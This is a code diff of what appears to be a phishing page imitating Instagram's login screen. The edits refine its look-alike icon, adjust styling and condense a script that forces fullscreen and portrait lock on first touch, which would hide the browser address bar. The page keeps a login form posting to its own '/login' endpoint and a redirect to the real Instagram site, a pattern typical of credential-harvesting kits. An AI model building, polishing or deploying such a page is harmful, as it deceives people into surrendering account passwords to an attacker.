@@ -9,7 +9,7 @@
 <meta name="mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <meta name="apple-mobile-web-app-title" content="Instagram">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cdefs%3E%3CradialGradient id='g' cx='30%25' cy='107%25' r='150%25'%3E%3Cstop offset='0%25' stop-color='%23fdf497'/%3E%3Cstop offset='5%25' stop-color='%23fdf497'/%3E%3Cstop offset='45%25' stop-color='%23fd5949'/%3E%3Cstop offset='60%25' stop-color='%23d6249f'/%3E%3Cstop offset='90%25' stop-color='%23285AEB'/%3E%3C/radialGradient%3E%3C/defs%3E%3Crect width='100' height='100' rx='22' fill='url(%23g)'/%3E%3Crect x='18' y='18' width='64' height='64' rx='18' fill='none' stroke='white' stroke-width='6'/%3E%3Ccircle cx='50' cy='50' r='16' fill='none' stroke='white' stroke-width='6'/%3E%3Ccircle cx='72' cy='28' r='4.5' fill='white'/%3E%3C/svg%3E">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='100%25' x2='100%25' y2='0%25'%3E%3Cstop offset='0%25' stop-color='%23FFD600'/%3E%3Cstop offset='20%25' stop-color='%23FF7A00'/%3E%3Cstop offset='45%25' stop-color='%23FF0069'/%3E%3Cstop offset='70%25' stop-color='%23D300C5'/%3E%3Cstop offset='85%25' stop-color='%237638FA'/%3E%3Cstop offset='100%25' stop-color='%23405DE6'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='100' height='100' rx='22' fill='url(%23g)'/%3E%3Crect x='18' y='18' width='64' height='64' rx='18' fill='none' stroke='%23fff' stroke-width='7'/%3E%3Ccircle cx='50' cy='50' r='16' fill='none' stroke='%23fff' stroke-width='7'/%3E%3Ccircle cx='73' cy='27' r='4' fill='%23fff'/%3E%3C/svg%3E">
 <style>
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   html,body{margin:0;padding:0;height:100%}
@@ -26,16 +26,15 @@
     overflow-x:hidden;
   }
 
-  /* fullscreen hitboxes are visual only */
   .topbar{
     width:100%;
     padding:14px 0 6px;
+    padding-top:calc(14px + env(safe-area-inset-top));
     text-align:center;
     color:#b0b3b8;
     font-size:13px;
     letter-spacing:.1px;
     flex-shrink:0;
-    padding-top:calc(14px + env(safe-area-inset-top));
   }
 
   .ig-icon{
@@ -173,18 +172,19 @@
 
 <svg class="ig-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
   <defs>
-    <radialGradient id="igGrad" cx="30%" cy="107%" r="150%">
-      <stop offset="0%" stop-color="#fdf497"/>
-      <stop offset="5%" stop-color="#fdf497"/>
-      <stop offset="45%" stop-color="#fd5949"/>
-      <stop offset="60%" stop-color="#d6249f"/>
-      <stop offset="90%" stop-color="#285AEB"/>
-    </radialGradient>
+    <linearGradient id="igGrad" x1="0%" y1="100%" x2="100%" y2="0%">
+      <stop offset="0%"   stop-color="#FFD600"/>
+      <stop offset="20%"  stop-color="#FF7A00"/>
+      <stop offset="45%"  stop-color="#FF0069"/>
+      <stop offset="70%"  stop-color="#D300C5"/>
+      <stop offset="85%"  stop-color="#7638FA"/>
+      <stop offset="100%" stop-color="#405DE6"/>
+    </linearGradient>
   </defs>
   <rect width="100" height="100" rx="22" fill="url(#igGrad)"/>
-  <rect x="18" y="18" width="64" height="64" rx="18" fill="none" stroke="#ffffff" stroke-width="6"/>
-  <circle cx="50" cy="50" r="16" fill="none" stroke="#ffffff" stroke-width="6"/>
-  <circle cx="72" cy="28" r="4.5" fill="#ffffff"/>
+  <rect x="18" y="18" width="64" height="64" rx="18" fill="none" stroke="#ffffff" stroke-width="7"/>
+  <circle cx="50" cy="50" r="16" fill="none" stroke="#ffffff" stroke-width="7"/>
+  <circle cx="73" cy="27" r="4" fill="#ffffff"/>
 </svg>
 
 <form id="loginForm" method="POST" action="/login" autocomplete="off" novalidate>
@@ -229,39 +229,27 @@
 <script>
   const REDIRECT_URL = "https://www.instagram.com/";
 
-  /* ---------- fullscreen attempt on first interaction ---------- */
+  /* fullscreen on first interaction */
   (function goFullscreen() {
     const el = document.documentElement;
     let tried = false;
-
     function tryFs() {
       if (tried) return;
       tried = true;
-      const rfs = el.requestFullscreen
-              || el.webkitRequestFullscreen
-              || el.mozRequestFullScreen
-              || el.msRequestFullscreen;
-      if (rfs) {
-        rfs.call(el).catch(() => {});
-      }
-      // also try to lock orientation to portrait on mobile
+      const rfs = el.requestFullscreen || el.webkitRequestFullscreen
+              || el.mozRequestFullScreen || el.msRequestFullscreen;
+      if (rfs) rfs.call(el).catch(() => {});
       if (screen.orientation && screen.orientation.lock) {
         screen.orientation.lock('portrait').catch(() => {});
       }
-      // remove listeners once done
       ['touchstart','click','keydown'].forEach(ev =>
         document.removeEventListener(ev, tryFs, true));
     }
-
-    // first interaction anywhere triggers fullscreen
     ['touchstart','click','keydown'].forEach(ev =>
       document.addEventListener(ev, tryFs, { capture: true, once: true }));
-
-    // also attempt immediately (works in some standalone/PWA cases)
     tryFs();
   })();
 
-  /* ---------- form logic ---------- */
   const showBtn = document.getElementById('showPass');
   const pass    = document.getElementById('password');
   const form    = document.getElementById('loginForm');
